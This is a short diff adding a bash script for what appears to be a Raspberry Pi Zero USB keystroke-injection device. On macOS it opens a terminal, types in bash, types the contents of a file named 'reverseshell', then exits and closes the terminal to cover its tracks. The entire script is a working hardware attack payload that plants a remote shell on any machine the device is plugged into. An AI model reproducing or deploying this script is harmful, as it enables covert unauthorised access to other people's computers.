@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+source /usr/local/pi0usbbox/confenv
+/usr/local/pi0usbbox/platform/macos/openterm
+# bash
+hid-print bash
+hid-sendkeys enter
+hid-printfile /usr/local/pi0usbbox/reverseshell
+hid-sendkeys enter
+hid-print exit
+hid-sendkeys enter
+sleep 0.1
+hid-sendkeys left-meta q
